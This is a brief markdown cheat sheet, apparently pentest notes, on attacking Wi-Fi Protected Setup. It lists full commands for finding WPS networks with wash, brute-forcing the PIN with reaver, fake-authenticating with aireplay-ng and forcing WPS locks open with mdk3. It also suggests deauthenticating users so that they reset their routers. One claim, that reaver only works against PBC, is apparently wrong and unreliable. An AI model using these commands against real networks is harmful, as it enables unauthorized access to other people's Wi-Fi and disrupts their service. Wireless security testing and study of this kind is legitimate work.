# Exploiting WPS
## Bypassing Failed to associate issue
To view WPS-enabled wifi
`wash -i <interface-name>`

`reaver --bssid <access-point-mac-address> --channel <access-point-channel> -i <interface-name> -A`

`aireplay-ng --fakeauth 100 -a <access-point-mac-address> -h <your-mac-address> <interface-name>`

## Bypassing 0x3 and 0x4 Errors
`reaver --bssid <access-point-mac-address> --channel <access-point-channel> -i <interface-name> -A -vvv --no-nacks`

`aireplay-ng --fakeauth 100 -a <access-point-mac-address> -h <your-mac-address> <interface-name>`

This is for solving the error of a stuck reaver progress in its bruteforce.

## Bypassing WPS Lock
Bruteforcing the routers can lead to some routers locking after a number of failed attempts

Try to reset the router or get the user to reset their router via deauthentication

run the wash and reaver command to check

### Unlocking using MDK3
MDK3 is a tool designed to exploit a number of weakness in 802.11 protocol.

`mdk3 <interface-name> a -a <mac-address-of-access-point> -n`
`wash -i <interface-name>`
`reaver -b <mac-address-of-access-point> -c <channel> -i <interface-name>`




Most guaranteed attack is using reaver
Only works against PBC auth

`wash -i <interface-name>` => get mac address
`reaver --bssid <access-point-mac-address> --channel <channel-nnumber> -i <interface-name>`
manually associate with the access point when running reaver
`aireplay-ng --fakeauth 100 -a <access-point-mac-address> -h <interface-mac-address> <interface-name>`

add the -vvv option for more verbose output for easy troubleshooting